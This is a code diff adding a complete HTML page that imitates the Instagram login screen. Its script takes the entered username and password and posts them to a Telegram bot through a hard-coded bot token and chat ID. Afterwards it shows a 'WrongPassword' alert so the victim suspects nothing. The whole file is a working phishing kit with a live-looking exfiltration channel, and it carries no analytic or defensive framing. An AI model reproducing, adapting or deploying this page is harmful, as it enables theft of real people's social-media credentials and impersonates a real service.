@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background: #fff;
+      width: 350px;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .login-container h1 {
+      font-family: 'Helvetica', sans-serif;
+      color: #262626;
+      margin-bottom: 20px;
+    }
+    .login-container input[type="text"], 
+    .login-container input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 10px;
+      background: #3897f0;
+      color: #fff;
+      font-weight: bold;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .login-container button:hover {
+      background: #3182ce;
+    }
+    .forgot-password {
+      margin-top: 15px;
+      color: #3897f0;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>Instagram</h1>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <a href="#" class="forgot-password">Forgot Password?</a>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      // Form inputs
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      // Telegram Bot Details
+      const botToken = "8197887428:AAEZPKYWbc-ZBXR7_l_XqUyCAqJHBa2IgXM"; // Replace with your bot token
+      const chatId = "6290965364"; // Replace with your chat ID
+      const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+      // Sending data to Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message }),
+      })
+        .then((response) => {
+          if (response.ok) {
+            alert("WrongPassword");
+          } else {
+            alert("Failed to send data to Telegram.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("Error sending data to Telegram.");
+        });
+    });
+  </script>
+</body>
+</html>
